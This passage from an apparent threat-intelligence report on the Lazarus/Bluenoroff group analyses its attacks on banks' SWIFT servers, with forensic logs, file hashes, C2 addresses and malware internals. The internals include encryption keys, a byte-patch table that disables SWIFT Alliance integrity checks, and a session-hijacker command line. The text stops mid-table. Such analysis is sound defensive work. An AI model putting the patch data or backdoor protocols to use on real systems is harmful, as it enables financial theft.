\nThen, we checked if the user ‘ [ADMIN ACCOUNT REDACTED]' had logged into the same \nsystem in the past. According to the event logs this had never happened before the attackers \nused it. Apparently, this user logon had very high privileges ( SeBackupPrivilege, \nSeLoadDriverPrivilege, SeDebugPrivilege, SeImpersonatePrivilege ), allowing the  remote \nuser to fully control the host, install system services, drivers, start processes as other users, and \nhave full control over other processes running in the system (i.e. inject code into their memory).  \n \nNext, we searched for other event log records related to the activity of the same account , and \nfound several records suggesting that this account was used from Host1 to access other hosts \nin the same domain.  \n Description  A logon was attempted using explicit credentials.  \n... \nAccount Whose Credentials Were Used:  \nAccount Name: [ADMIN ACCOUNT REDACTED]  \nAccount Domain: [REDACTED]  \nLogon GUID: {00000000 -0000 -0000 -0000 -000000000000}  \nTarget Server:  \nTarget Server Name: [REDACTED]  \nAdditional Information: [REDACTED]  \nProcess Information:  \nProcess ID: 0x00000000000xxxxx  \nProcess Name: C:\\Windows \\System32 \\schtasks.exe  \nNetwork Information:  \nNetwork Address: - \nPort: -  \nThis event is generated when a process attempts to log on an account by \nexplicitly specifying that account’s credentials.  This most commonl y \noccurs in batch -type configurations such as scheduled tasks, or when \nusing the RUNAS command . \n \nThis indicates that the account was used to create new scheduled tasks on the remote hosts. \nThis is one of the popular ways to remotely run new process es and propagate infection s during \ncyber attacks.  \n \nThen we searched for other similar attempts to start schtasks.exe remotely on other hosts and \ncollected several of them.  \nLateral Movement. Host2.  \nThis host contained several unique and very large malware modules.  \nThe following files were found on the system:  \n \nFilename  Size MD5  \nC:\\Windows \\gpsvc.exe  3'449'344 bytes  1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae  \nC:\\Windows \\Help\\srservice.chm  1'861'632 bytes  cb65d885f4799dbdf80af2214ecdc5fa \n(decrypted file MD5: \nad5485fac7fed74d112799600edb2fbf)  \nC:\\Windows \\Help\\srservice.hlp  3696 bytes  954f50301207c52e7616cc490b8b4d3c \n(config file, see description of \nad5485fac7fed74d112799600edb2fbf)  \nC:\\Windows \\System32 \\srservice.dll  1'515'008 bytes  16a278d0ec24458c8e47672529835117  \nC:\\Windows \\System32 \\lcsvsvc.dll  1'545'216 bytes  c635e0aa816ba5fe6500ca9ecf34bd06  All of this malware were  general purpose backdoors and their respective dropper s, loaders and \nconfiguration files. Details about this malware is available in the Appendix.  \nLateral Movement. Host3.  \nThe following malicious files were found on the system:  \n \nFilename  Size MD5  \nC:\\Windows \\gpsvc.dat  901'555 bytes  c1364bbf63b3617b25b58209e4529d8c  \nC:\\Windows \\gpsvc.exe  753'664 bytes  85d316590edfb4212049c4490db08c4b  \nC:\\Windows \\msdtc.bat  454 bytes  3b1dfeb298d0fb27c31944907d900c1d  \n \nGpsvc.dat contains an encrypted payload for an unidentified  loader. It's possible that the loader \nwas placed on a different host following the anti -forensic technique that we have observed \npreviously  or gpsvc.exe is the loader but we are missing the secret passphrase passed via \ncommandline . The decrypted  files are described in the Appendix t o this report.  \nCease of Activity  \nIn several cases we investigated, once the attackers were confident they had been  discovered , \nbecause they lost some of the compromised assets, they started wiping the remaining malware \npayloads. This indicates a skilled at tacker, who cares about being discovered.  \nOther Known Operations  \nThe attack on European financial institutions was implemented via a watering hole, a \ncompromised government website that had many regular visitors from local banks. However, \nthe same approach  has been  used in multiple other places around the world. The Polish \nwaterhole incident got much more public attention than the others due to the escalation of the \nalert to a higher level and the compromise of a government website.  \n \nWe have seen a few other websites being compromised with the same symptoms and turned \ninto a watering hole through script injection or by placing exploit delivery code. We have found \nthem in the following countries:  \n \n● Russian Federation  \n● Australia  \n● Uruguay  \n● Mexico  ● India  \n● Nigeria  \n● Peru  \n What connected most of the compromised websites was the JBoss application server platform. \nThis suggests that attackers may have an exploit for the JBoss server. Unfortunately we haven’t  \nmanage d to find the exp loit code yet. Nevertheless , we would like to recommend to all JBoss \napplication server administrators that they  limit unnecessary access to their servers  and check \nthe access logs for attack attempts.  \n \nBanks were not the only Lazarus Group targets. This  suggests that it has  multiple objectives. \nWe have seen some unusual victims, probably overlapping with the wider Lazarus Group \noperations, i.e. a cryptocurrency business . When it comes to Bluenoroff , its typical list of targets \nincludes banks, financial and  trading companies , casinos  and cryptocurrency businesses . \n \nDetections of Lazarus/Bluenoroff malware are also distributed across the world. Here are some:  \n \n \n  \nConclusions  \nLazarus is not just another APT actor. The scale of Lazarus operations is shocking. It has been \non a growth spike since 2011 and activities didn't disappear after Novetta published the results \nof its Operation Blockbuster research. All those hundreds of samples that were coll ected give \nthe impression that Lazarus is operating a factory of malware , which produces new samples via \nmultiple independent conveyors.  \n \nWe have seen it using various code obfuscation techniques, rewriting its own algorithms, \napplying commercial software  protectors, and using its own and underground packers. Lazarus \nknows the value of quality code, which is why we normally see rudimentary backdoors being \npushed during the first stage of infection. Burning those doesn't cause too much impact on the \ngroup. However, if the first stage backdoor reports an interesting infection it starts  deploying \nmore advanced code, carefully protecting it from accidental detection on disk. The code is \nwrapped into a DLL loader or stored in an encrypted container , or maybe hid den in a binary \nencrypted registry value. It usually comes with an installer that only the attackers can use, \nbecause they password protect it. It guarantees that automated systems - be it public sandbox \nor a researcher's environment - will never see the r eal payload.  \n \nMost of the tools are designed to be disposable material that will be replaced with a new \ngeneration as soon as they are burnt. And then there will be new er, and new er, and new er \nversions . Lazarus avoids reusing the same tools, the same code, and the same algorithms. \n\"Keep morphing!\" seems to be its internal motto. Those rare cases when it is caught with the \nsame tools are operational mistakes, because the group seems to be so large that one part \ndoesn't know what the other is doing . \n \nAll this level of sophistication is something that is not generally found in the cybercriminal world. \nIt's something that requires strict organization  and control at all stages of the operation. That's \nwhy we think that Lazarus is not just another APT actor.  \n \nOf course such a process requires a lot of money to keep running the business , which is why \nthe appearance of the Bluenoroff subgroup within Lazarus was logical.  \n \nBluenoroff , as a subgroup of Lazarus , is focused only on financial attacks. It has re verse \nengineering skills and spends  time tearing apart legitimate software, implementing patches for \nSWIFT Alliance software, and finding ways and schemes to steal big money. Its malware is \ndifferent  and the attackers  aren't exactly soldiers that hit and r un. Instead they prefer to make an \nexecution trace to be able to reconstruct and quickly debug the problem. They are field \nengineers that come when the ground is already cleared after the conquest of  new lands.  \n \nOne of Bluenoroff's favorite strategies is to silently integrate into running processes without \nbreaking them . From the perspective of the code we've seen it looks as if it is  not exactly looking \nfor hit and run solution s when it comes to money theft. Its solutions are aimed at invisible theft \nwithout leaving a trace. Of course , attempts to move around millions of USD can hardly remain unnoticed but we believe that its malware might  now be secretly deployed in many other  \nplaces - and it doesn't trigger any serious alarms because it's much more quiet.  \n \nWe would like to note, that in all the observed attacks against banks that we have analyzed , \nservers used to connect to SWIFT  didn't demonstrate or expose  any specific vulnerability . The \nattacks were focused on the banks ’ infrastructure and staff, exploiting vulnerabilities in \ncommonly used software or websites, bruteforcing passwords, using keyloggers and elevating \nprivileges. However,  the design of inter -banking transactions using a bank's own server  running \nSWIFT connected  software  suggests that there are  personnel responsible for the administration \nand operation of the SWIFT  connected  server. Sooner or later the attackers find these users, \ngain their necessary privileges and access the server connected to the SWIFT messaging \nplatform. With administrative access to the platform , they can manipulate the software running \non the system as they wish . There is not much that can stop them, because from a technical \nperspective it may not differ from what authorized and qualified engineers do: starti ng and \nstopping services, patching software, or modifying database s.  \n \nTherefore , in the breaches we analyzed , SWIFT as an organization  hasn’t been directly at fault . \nMore than that, we have witnessed SWIFT trying to protect its customers by implementing the \ndetection of database and software integrity issues. We believe that this is  the right direction \nand has to be extended with full support. Complicating patches of integrity checks further may \ncreate a serious threat to the success of further operations run by Lazarus/Bluenoroff against \nbanks worldwide.  \n \nTo date, the Lazarus/Bluenoroff group has been  one of the most successful in large scale \noperations against financial industry. We believe that it will remain one of the biggest threats to \nthe banking sec tor, finance and trading companies as well as casinos , for years to come . \n \nAs usual, defense against attacks such as those from Lazarus/Bluenoroff should include a multi -\nlayered approach. Kaspersky Lab products include special mitigation strategies against  this \ngroup, as well as many other APT groups we track. If you are interested in reading more about \neffective mitigation strategies in general, we recommend the following articles:  \n \n● Strategies for mitigating APTs  \n● How to mitigate 85% of threats with four strategies  \n \nWe will continue tracking the Lazarus/Bluenoroff actor and will share new findings with our intel \nreport subscribers as well as with the general public. If you would like to be  among  the first to \nhear our news , we suggest you subscribe to our intel reports.  \n \nFor more information, contact: intelreports@kaspersky.com.  \n \n  Appendix: Malware Analysis  \nMalware 1: SWIFT  transactions  Information Harvester (New Runoff)  \nMD5: 0abdaebbdbd5e6507e6db15f628d6fd7  \nDiscovered path: C: \\MSO10 \\fltmsg.exe  \nDate: 2016.08.18 23:44:21  \nSize: 90'112 bytes  \nCompiled on: 2016.08.18 22:24:41 (GMT)  \nLinker version: 10.0  \nType: PE32 executable (GUI) Intel 80386, for MS Windows  \nInternal Bluenoroff module tag: NR  \nUsed in: Incident #1  \n \nAn almost identical file was found in another location with the following properties:  \nMD5: 9d1db33d89ce9d44354dcba9ebba4c2d  \nDiscovered path: D: \\Alliance \\Entry \\common \\bin\\win32 \\nroff.exe  \nDate detected: 2016 -08-12 22:24:19  \nSize: 89'088 bytes  \nCompiled on: 201 6.08.12 12:25:02 (GMT)  \nType: PE32 executable (GUI) Intel 80386, for MS Windows  \nInternal module mark: NR  \n \nThe compilation timestamp indicates the malware was compiled exactly one day before being \nused in the bank.  \n \nThe module starts from creating  a \"MSO10\" directory on the logical drive where  the Windows \nsystem is installed, i.e. C:\\MSO10 . Also, it crafts several local filepaths , the purpose of which \nisn't clear . Not all have reference in the code and they could be copy -pasted code or part of  a \ncommon file i n the framework. The paths are represented with the following strings:  \n● %DRIVE%: \\MSO10 \\LATIN.SHP  \n● %DRIVE%: \\MSO10 \\ENGDIC.LNG  \n● %DRIVE%: \\MSO10 \\ADDT.REF  \n● %DRIVE%: \\MSO10 \\MSE.LIV  \nUpon start ing it makes five attempts to read file C:\\MSO10 \\LATIN.SHP with an interval o f \n100ms. If the LATIN.SHP container is not found or has an  invalid signature, the log record will \ncontain the following message: \" NR-PR\", which we assume indicates a PRoblem loading \nmodule codenamed \" NR\". The name \"NR\" is probably a reference to the printer helper program \ncalled \"nroff\" used by SWIFT Alliance software. The origins of the nroff name go back to a Unix \ntext-formatting program according to Wikipedia . \n The file is read successfully if its size is larger than or equal to a hardcoded value of 35,260 \nbytes. After that the module decrypts the file with an RC4 algorithm using a hardcoded \nencryption key:  \n4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF.  \nThis ha rdcoded key is quite unique and has been  discovered in few other places, including in \nother tools from the set of malware used to attack SWIFT  Alliance  software and within the Wiper \nTool discovered in Bangladesh in early 2016 (MD5: 5d0ffbc8389f27b0649696f0 ef5b3cfe). It was \nalso used in another tool to encrypt configuration files as reported  by BAE Systems.  \n \nThe decrypted data from the file is validated by checking the magic heade r of the data, which \nshould be 0xA0B0C0D0  value. The file contains a configuration of 35,260 bytes which is copied \nto a reserved memory and a sequence of data blocks of 1096 bytes each. The number of blocks \nmay vary, the module reads them all and stores them in a linked list structure.  \n \nThere is an internal logging feature implemented in the current module, which keeps  a text log \nin C:\\MSO10 \\ENGDIC.LNG. The text records are stored in lines of the following format:  \n[%Hour%:%Minute%:%Second%] [%Process_PID%] %Message% \\r\\n \nThe message may contain the following prefixes:  \n \n● [ERROR]  \n● [INFO]  \n● [WARNING]  \n \nThis executable is designed to be called with three  parameters:  \nfltmsg.exe <mode> <print file> <output -path>  \nThe first parameter is a number 1 or 2. If any other value  is passed to the executable it simply \nsaves it to the log in the format of \" NR-PR-P %mode%\" . We assume that \"NR -PR-P\" is \ninterpreted by the attackers as \"nroff problem parameter\".  \n \nMode 1 means that the module shall select the output path automatically, w hich contains the \nfollowing string template: \" #%04d%04d.prt \", otherwise the output path is copied from the third \ncommand  line argument.  \n \nFor recognized modes 1 and 2 the module saves a backup for every \"print file\" passed to it via \ncommand  line that has the extension \".prt\", \".out\" or \".txt\". The backups are stored in one of the \nfollowing directories:  \n● C:\\MSO10 \\P %N% \\MOT \\ \n● C:\\MSO10 \\R %N% \\MOT \\ \n● C:\\MSO10 \\N %N% \\MOT \\ \nWhere %N% is a sequential integer number.  \n \n \n The malware is an information harvester. It processes  files passed to it, parses them and \nsearches for specific SWIFT  transaction  codes, such as:  \n● 28C: Statement Number  \n● 25: Account Identification  \n \nIts main purpose is to accumulate information about transactions passed through it, saving \nSender and Receiver, Account and Statement Numbers as well as some other data included in \nparsed files. The files passed to it are allegedly in the SWIFT  transaction  format, which \nsuggests that the attackers were closely accustomed to internal SWIFT documentation or \ncarefully reverse engineered the format. It recognizes the following format tags:  \n● 515 (M51)  \n● 940 (M94) - start of day balance  \n● 950 (M95) - end of day balanc e \n \nWhen such files are found , it logs them into the log folder drive: \\MSO10 and saves a copy.  \nThe RC4 -encrypted file we found (LATIN.SHP) contained  the following strings after decryption:  \n \n● D:\\Alliance \\Entry \\database \\bin\\sqlplus.exe  \n● D:\\Alliance \\Entry \\common \\bin\\win32  \n● D:\\Alliance \\Entry  \n● C:\\MSO10 \\fltmsg.exe  \n● C:\\MSO10 \\MSO.DLL  \n● C:\\MSO10 \\MXS.DLL  \n● \\\\127.0.0.1 \\share  \n● localhost \\testuser  \n● \\\\127.0.0.1 \\share \\ \n \nIn the older case from Bangladesh the config contained SWIFT business identifier codes (BIC)  \nto hide in SWIFT transaction statements.  \nMalware 2: SWIFT Alliance Access  Protection Mangler  \nMD5: 198760a270a19091582a5bd841fbaec0  \nSize: 71'680 bytes  \nDiscovered path: C: \\MSO10 \\MSO.dll  \nCompiled on: 2016.08.18 22:24:44 (GMT)  \nLinker version: 10.0  \nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows  \nInternal Bluenoroff module tag: PM  \nUsed in: Incident #1  \n \nThe compilation timestamp indicates the malware was compiled in the  days preceding the \nattack on the bank.  \n This malware tool is used to patch some SWIFT Alliance so ftware modules in the memory to \ndisable certain protection mechanisms that were implemented to detect direct database \nmanipulation attempts. The code was most likely created by the same developer that created \nSWIFT  transactions  Information Harvester (MD5: 0abdaebbdbd5e6507e6db15f628d6fd7). Like  \nthe information harvester it creates  a \"MSO10\" directory on the logical drive where the Windows \nsystem is installed, i.e. C:\\MSO10 . \n \nIt also crafts several local filepaths , the purpose of which isn't clear . Not all h ave reference in \nthe code and could be a copy -pasted code or part of common file in the framework:  \n● %DRIVE%: \\MSO10 \\LATIN.SHP  \n● %DRIVE%: \\MSO10 \\ENGDIC.LNG  \n● %DRIVE%: \\MSO10 \\ADDT.REF  \n● %DRIVE%: \\MSO10 \\MSE.LIV  \n \nUpon start ing it makes five attempts to read file C:\\MSO10 \\LATIN.SHP with an interval of \n100ms. If the LATIN.SHP container is not found or is invalid, the log will contain the following \nmessage: \" PM-PR\". The file is read successfully if its size is larger or equal to a hardcoded \nvalue of 35,260 . After tha t the module decrypts the file with  an RC4 algorithm using a \nhardcoded encryption key: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF.  \n \nThe decrypted data from the file is validated by checking the magic header of the data, which \nshould be 0xA0B0C0D0  value. \n \nThe file contains a configuration block of 35,260 bytes which is copied to a reserved memory \nand a sequence of data blocks of 1096 bytes long. The number of blocks may vary, the module \nreads them all and stores them in a linked list structure.  \n \nIf the LATIN.SHP file is found then the module simply counts the number of record s in it and \nproceeds with patching the target file, which is described fu rther. If it is not found or the file \nmagic bytes differ from expected after decryption, then the patching do es not happen and the \ncode simply drops execution.  \n \nThere is  an internal logging feature implemented in the current module, which keeps text log in \nC:\\MSO10 \\ENGDIC.LNG. The following log messages may appear in this file in plaintext:  \n \nLog message format  Description of values  \nPatchMemory(%s, %d)  %s - current executable filename  \n%d - 0 or 1 (0 - unpatch operation, 1 - patch \noperation)  \n[PatchMemory] %s  %s - current executable filename  \n[PatchMemory] LoadLibraryA(%s) = %X  %s - additional DLL filename  \n%X - additional DLL image base address  [WorkMemory] %s %d End  %s - executable name to be patched  \n%d - process ID value  \nThis is printed in case of failure to open process  \n[WorkMemory] pid=%d, name=%s  %d - process ID value  \n%s - executable name to be patched  \n[Patch] 1 Already Patched %s  %s - executable name to be patched  \n[Unpatch] 1 Already Unpatched %s  %s - executable name to be patched  \n[Patch] 1 %s  %s - executable name to be patched  \n[Patch] 1 %s  %s - executable name to be patched  \nP[%u -%d] %d  %u - process ID which is patched  \n%d - patch index (starts from 0), corresponds to \npatch block  \n%d - contains last WinAPI error code  \nThis is printed in case of failure to patch memory  \nP[%u -%d] OK  %u - process ID which is patched  \n%d - patch index (starts from 0), corresp onds to \npatch block  \n[Patch] 2 Already Patched %s  %s - executable name to be patched  \n[Unpatch] 2 Already Unpatched %s  %s - executable name to be patched  \n[Patch] 2 %s  %s - executable name to be patched  \n[Patch] 2 %s  %s - executable name to be patched  \n \nThe module has seven  embedded blocks of 0x130 bytes long that contain patch target \ninformation.  \n \nEach block seems to have four slots of 0x4C bytes with patch information . However , only the \nfirst slot per module is used at this point . Each slot contains information for just two code \nmodifications.  \n \nThe patch slots include the size of the patch, and the relative path to the module to be patched \non disk, offset to the patched bytes (contain ing the  relative virtual address) and original bytes. \nThe patcher verifies that the original bytes are in place before modifying the code. The patch \nprocedure can also do unpatching by design, however this feature is currently unused.  \n \nThe first slot is a patch for the liboradb.dll library which seems to be essential and is applied in \nall cases. Other patches are designed for specific executable s that the current SWIFT Alliance \nSoftware  Patcher DLL module is loaded in. It searches for a corresponding patch that matches \nthe current process executable fil ename and applies only that patch . The following table contains an interpretation of the patch -blocks embedded into the binary. The \ntable omits empty slots and shows only valid patch instructions:  \nBlock  Module  Patch \nRVA Original \ncode  Replacement  Description  \n1 liboradb.dll  0x8147e  04 00 Disable s checksum \nverification  \n2 Block is Unused  \n3 MXS_cont.exe  0xff49  e8c2fbffff  b801000000  Disables internal \nsecurity checks.  \n 0x10b0c  e8c2fbffff  b801000000  \n4 mxs_ha.exe  0x65a9  e8c2fbffff  b801000000  Disables  internal \nsecurity checks.  \n 0x716c  e8c2fbffff  b801000000  \n5 sis_sndmsg.exe  0x49719  e8c2fbffff  b801000000  Disables internal \nsecurity checks.  \n 0x4a2dc  e8c2fbffff  b801000000  \n6 SNIS_sendmsg.exe  0xa8119  e8c2fbffff  b801000000  Disables internal \nsecurity checks.  \n 0xa8cdc  e8c2fbffff  b801000000  \n7 SNSS_cont.exe  0x7849  e8c2fbffff  b801000000  Disables internal \nsecurity checks.  \n 0x840c  e8c2fbffff  b801000000  \n \nSWIFT Alliance software binary tools are linked with file \"saa_check.cpp\" , which provides basic \nsecurity checks and validates the integrity of the database. The patches are applied to the \nmodules to disable these checks and prevent the detection of database inconsistency. The file \nselection is not random, as far as the SWIFT  connected servers  server environment is a \ncomplex of executable files with complicated relations, the attackers identified all executables \nthat implemented new security features and patched them off. We have checked all other \nbinaries on the analyzed servers and none of other applications were linked with \nsaa_check.cpp, except those in the patchlist.  \n \nThe patcher DLL has to be loaded into the address space of the target process to work. It is not \ndesigned to patch other processes.  Malware 3: SWIFT Alliance sof tware  Files  Hook  \nMD5: f5e0f57684e9da7ef96dd459b554fded  \nSize: 91'136 bytes  \nDiscovered path: C: \\MSO10 \\MXS.dll  \nCompiled on: 2016.08.18 22:24:31 (GMT)  \nLinker version: 10.0  \nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows  \nInternal Bluenoroff module  tag: HD (alternative: HF)  \nUsed in: Incident #1  \n \nThe compilation timestamp indicates the malware was compiled during the days of the attack on \nthe bank.  \n \nIt is very similar to SWIFT  transactions  Information Harvester and SWIFT  Alliance software  \nProtection Mangler. Like the information harvester it creates  a \"MSO10\" directory on the logical \ndrive where the Windows system is installed, i.e. C:\\MSO10 . \n \nSimilarly , it crafts several local filepaths:  \n● %DRIVE%: \\MSO10 \\LATIN.SHP  \n● %DRIVE%: \\MSO10 \\ENGDIC.LNG  \n● %DRIVE%: \\MSO10 \\ADDT.REF  \n● %DRIVE%: \\MSO10 \\MSE.LIV  \n \nUpon start ing it makes five attempts to read file C:\\MSO10 \\LATIN.SHP with an interval of \n100ms. If the LATIN.SHP container is not found or is invalid, the log will contain the following \nmessage: \" HD-PR\". The file is read successfully if its size is larger than or equal to a hardcoded \nvalue of 35,260 . After that the module decrypts the file with an RC4 algorithm using the \nhardcoded encryption key: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF.  \nThe decrypted d ata from the file is validated by checking the magic header of the data, which \nshould be 0xA0B0C0D0  value.  \nThe file contains a configuration of 35,260 bytes which is copied to a reserved memory and a \nsequence of data blocks 1096 bytes long. The number of b locks may vary, the module reads \nthem all and stores them in a linked list structure.  \n \nIf the LATIN.SHP file is found then the module simply counts the number of records in it and \nproceeds. If it is not found or the magic file bytes differ from expected af ter decryption, then the \npatching will not happen and the code simply drops execution.   \n \nThere is an internal logging feature implemented in the current module, which keeps a text log \nin C:\\MSO10 \\ENGDIC.LNG. The following log messages may appear in a file in plaintext:  \n \n \n Log message format  Description of values  \nHF_Initialize(%s)  %s - current executable filename  \nNewCopyFileA(%s, %s, %d)  The arguments correspond to source, destination \nfile and flag value for \"overwrite if exists\".  \nNewCopyFileA ->CreateProcess(%s) \nfailed with error=%d  %s - commandline of a fltmsg.exe process  \n%d - Win32 API integer error code  \nNewCreateProcessA(%s) - 1 %s – command  line of a new process  \nNewCreateProcessA(%s) - 2 %s – command  line replacement  \n \nThe purpose of this module is in patching the current process, so that CopyFileA function in fact \ncalls a custom hook function, which calls CreateProcessA and passes some arguments to it. \nThe command  line for the new process is as follow s: \n \nC:\\MSO10 \\fltmsg.exe 2 \"%source_path%\" \"%destination_path%\"  \n \nThe path to the fltmsg.exe  process is taken from the decrypted configuration file \nC:\\MSO10 \\LATIN.SHP . \n \nAnother API function , CreateProcessA is similarly hooked. Any call to create a new process , \nwhich starts one of two recognized executables \"nroff\" or \"printhelper\" , is modified. Before the \noriginal executables are called , a custom application will be spawned with the following \ncommandline:  \nC:\\MSO10 \\fltmsg.exe 0 %original arguments% - for nroff  \nC:\\MSO10 \\fltmsg.exe 1 %original arguments% - for printhelper  \n \nIf the execution fails the module logs a failure message with a Win32 API error code.  \n \nWe assume that this module is injected in the middle of running SWIFT Alliance software, to \ndivert some of the  interesting files for alteration or to make a reserve copy.  \n \nMalware 4: Session Hijacker  \nMD5: 2963cd266e54bd136a966bf491507bbf  \nDate (appeared in collection): 2015 -05-23 02:27  \nSize: 61'440 bytes  \nDiscovered path: c: \\windows \\mdtsc.exe  \nCompiled on: 2011.02.18  07:49:41 (GMT)  \nType: PE32+ executable (console) x86 -64, for MS Windows  \nLinker version: 10.0  \nUsed in: Incident #1  This file is a command  line tool to start a new process as another user currently logged on to the \nsame system. To find the user token , one of  the following case -insensitive command  line \noptions is used:  \nOption  Description  \n-n <Name>  Find token by process name  \n-p <PID>  Find token by process ID  \n-s <SESSID>  Find token by Terminal session ID  \n \nThe last command  line option defines the command  line of the new process to start.  \n \nExample usage:  \nc:\\windows \\mdtsc.exe  -p 8876 \"rundll32.exe c: \\windows \\fveupdate.dll,Start MAS_search.exe\"  \n \nThe example tool usage was recovered from an infected system during forensic analysis. It was \nused to start a SWIFT A lliance software tool via a custom application starter that most probably \ntampered with the new process. The fveupdate.dll module was not recovered from the system.  \nMalware 5: TCP Tunnel Tool  \nMD5: e62a52073fd7bfd251efca9906580839  \nDate discovered: 2016.08.1 2 01:11:31  \nDiscovered path: C: \\Windows \\winhlp.exe  \nSize: 20'480 bytes  \nKnown as: winhlp.exe, msdtc.exe  \nLast start date: 2016.08.12 21:59  \nStarted by: svchost.exe (standard Windows signed binary)  \nCompiled on: 2014.09.17 16:59:33 (GMT)  \nType: PE32 executable (GU I) Intel 80386, for MS Windows  \nLinker version: 6.0  \nUsed in: Incident #1  \n \nThis application is a tool that works as a simple TCP relay that encrypts communication with C2 \nand contains remote reconfiguration capability. It has to be started with at least two parameters \ncontaining host IP and port. Two additional optional parameters may define the destination \nserver IP and port to relay network connections to. The destination server IP and port can be \nretrieved and reconfigured live from C2. Let's refer to the se pairs of IP/ports as HostA/PortA and \nHostB/PortB respectively.  \n \n \n \n When the tool starts it attempts to connect to the C2 server, which starts from the generation of \na handshake key. The handshake key is generated via a simple algorithm such as the following:  \n \n i = 0;  \n  do \n  { \n key[i] = 0xDB * i ^ 0xF7;  \n ++i; \n  } while ( i < 16 );  \n \nThis algorithm generates the following string:  \nASCII  Hexadecimal  \n,-./()*+$%& \\' !\" 2c 2d 2e 2f 28 29 2a 2b 24 25 26 27 20 21 22  \n \nNext, it generates a message body, a string of bytes from 64 to 192 bytes long. The fifth \nDWORD in the message is replaced with special code 0x00000065 (\"e\" character). Then  it \nencrypts the message with  a handshake key and sends it to the C2 server with the dat a block \nlength prepended to that buffer.  \n \nThis is what such a packet looks like (blue rows are encrypted with RC4 and handshake key):  \nOffset (bytes)  Size (bytes)  Description  \n0 4 Size of the rest of data in the message  \n4 16 Random data  \n20 4 Special code  0x00000065 (\"e\")  \n24 >=64  Random data  \n \nIt expects similar behaviour from the server. The server responds with similar packet, where the \nfirst DWORD is the size of the rest of the packet and the only meaningful value is at offset 0x14, \nwhich must contain 0x00000066 (\"f\") or the handshake is not successful.  \n \nIf the handshake is successful, the tool spawns a dedicated thread to deal with  the C2 \nconnection.  \n \nIt uses RC4 encryption to communicate with the C2 over TCP with a hardcoded 4 -bytes key \nvalue: E2 A4 8 5 92. \n \n \n The analyzed sample uses binary protocol for communication, exchanging messages in fixed \nlength blocks of 40 bytes, which  are encrypted with RC4 as mentioned above. Each such block \ncontains a DWORD at offset 0x4 describing a control code used in the protocol. Other fields in \nthe block may contain additional information or be set to a randomly generated number for \ndistraction.  \n \nClient  Server  \nControl Code  Meaning  Control Code  Meaning  \n0x10001  Ready to work  0x10000  Keep -Alive  \n0x10008  Task Done  0x10002  Start tunnelling with HostB  \n  0x10003  Set new HostB/PortB  \n  0x10004  Get current HostB/PortB  \n  0x10006  Terminate immediately  \n \nFor the Control Code 0x10003, additional information including IP and port number s are \ntransferred in the same message block at offsets 0x10 for IP and 0x14 for port.  \n \nThe tool will not start connecting to HostB until it receives a 0x10002 command to start the \ntunnelling proce ss. When this happens it will open an additional , independent TCP session with \nHostA, will do a handshake , and then pass all data back and forth without modification.  \n \nOther variants of the tool were found in different places:  \n \n02f75c2b47b1733f1889d6bbc026157c - uploaded to a multiscanner from Bangladesh.  \n459593079763f4ae74986070f47452cf - discovered in Costa Rica.  \nce6e55abfe1e7767531eaf1036a5db3d - discovered in Ethiopia . \n \nAll these tools use the same hardcoded RC4 key value of E2 A4 85 92 . \n \nMalware 6: Active Backdoors  \nMD5: 2ef2703cfc9f6858ad9527588198b1b6  \nType: PE32 executable (GUI) Intel 80386, for MS Windows  \nSize: 487'424 bytes  \nName: mso.exe  \nLink time: 2016.06.14 11:56:42 (GMT)  \nLinker version: 6.0  \nUsed in: Incident #1, Inciden t #2 This module is linked with opensource SSL/TLS suite mbedTLS (aka PolarSSL) as well as zLib \n1.2.7 and libCURL libraries.  \n \nCommand line options:  \nIMEKLMG.exe [filepath] [ -i] [<C2_IP> <C2_PORT> ...] [-s] \n-i  self-install in the registry and restart self w ith previous path as argument.  \n[filepath]  sleep for 3 seconds, delete the specified path, restart self with option \" -s\". \n<C2_IP> <C2_PORT> ...  one or more pairs of C2 IP and port can be passed here.  \n-s  start the main backdoor mode  \n \nStarting the executable with no option is equivalent to starting with \" -i\", which initiates a \nsequence of restarts eventually leading to self -installation into the autorun key and user's \n%App_Data% directory. The final command  line string to start the back door (as per registry \nautorun key)  is: C:\\Users \\%user% \\AppData \\Roaming \\IMEKLMG.exe -s \n \nDepending on the available command  line arguments the module may use a C2 address from \nthe following locations:  \n1. C2 configuration stored in the registry (expected 1840 bytes). The configuration is \nlocated at HKLM \\SYSTEM \\CurrentControlSet \\Control \\Network \\EthernetDriver. The data \ninside the key is encrypted with a DES algorithm with  a hardcoded encryption key: 58 29 \nAB 7C 86 C2 A5 F9 . \n2. Hardcoded C2 address and port.  \n3. [Unfini shed backdoor code]  Use a C2 address and port passed via command  line. Note, \nthis code is currently unfinished: it contains a command  line argument parsing and \nsetting in the memory of the backdoor: up to six pairs of C2 host s and port s can be \npassed to it , but this information seems not to be reaching the main backdoor code yet.  \n \nIf the registry value with config is not set upon the backdoor start, it creates this value , \npopulating the config with hardcoded values.  \n \nWhen the module is passed to a domain an d port pair via the command  line, config from the \nregistry or hardcoded value, it resolves the IP address of the domain (if the domain is passed) \nand produces a different IP by decrypting the DNS request with a 4-byte XOR operation. The \nXOR constant is har dcoded: 0xF4F29E1B.  \n  Hardcoded C2s:  \n \n● update.toythieves[.]com:8080  \n● update.toythieves[.]com:443  \n \nIP xor Key  \n(Real C2)  Country  First Seen  Last Seen  Resolved IP (C2 disguise)  \n67.65.229[.]53  US 2015 -08-05 2015 -08-19 88.223.23.193  \n62.201.235[.]227  Iraq 2015 -08-26 2015 -10-23 37.87.25.23  \n127.0.0.1  N/A 2015 -10-30 2015 -11-20 100.158.242.245  \n46.100.250[.]10  Iran 2015 -11-27 2016 -01-07 53.250.8.254  \n76.9.60[.]204  Canada  2016 -01-14 2016 -08-17 87.151.206.56  \n \n \nThe application establishes a HTTPS connection, introducing itself as \"TestCom 18467\" \n(hostname) during a TLS handshake.  \n \nThe backdoor protocol supports the following commands sent as DWORD constants:  \n \nCommand ID  Description  \n0x91B93485  Get system information: hostname, OS version, locale, list of network \ninterface cards with properties.  \n0x91B9348E  Sleep command. Disconnect from C2. Save current time and show no \nnetwork activity for a specified time.  \n0x91B93491  Hibernate command. Disconnect from C2 and show no network \nactivity. Seems like this sle ep is persistent over program restarts.  \n0x91B9349A  Show all available drives and used/available space on them.  \n0x91B9349B  List files in specified directory.  \n0x91B9349D  Change current directory.  \n0x91B93486  Run specified command.  \n0x91B934A6  Run specified 